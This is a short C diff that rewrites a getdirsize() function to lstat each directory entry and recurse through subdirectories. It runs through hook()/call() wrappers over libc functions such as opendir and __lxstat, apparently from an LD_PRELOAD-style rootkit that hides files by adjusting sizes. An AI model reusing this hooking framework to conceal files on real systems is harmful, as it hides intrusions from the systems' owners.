@@ -15,11 +15,12 @@ off_t getnewfilesize(const char *path, off_t fsize){
 }
 
 off_t getdirsize(const char *dirpath){
+    struct stat sbuf;
     off_t ret=0;
     DIR *dp;
     struct dirent *dir;
 
-    hook(COPENDIR, CREADDIR);
+    hook(COPENDIR, CREADDIR, C__LXSTAT);
 
     dp = call(COPENDIR, dirpath);
     if(dp == NULL) return 0;
@@ -30,7 +31,14 @@ off_t getdirsize(const char *dirpath){
 
         char path[strlen(dirpath)+strlen(dir->d_name)+2];
         snprintf(path, sizeof(path), "%s/%s", dirpath, dir->d_name);
-        ret = ret+getfilesize(path);
+        memset(&sbuf, 0, sizeof(struct stat));
+        if((long)call(C__LXSTAT, _STAT_VER, path, &sbuf) < 0)
+            continue;
+
+        if(S_ISDIR(sbuf.st_mode))
+            ret += getdirsize(path);
+        else
+            ret += sbuf.st_size;
     }
     closedir(dp);
 
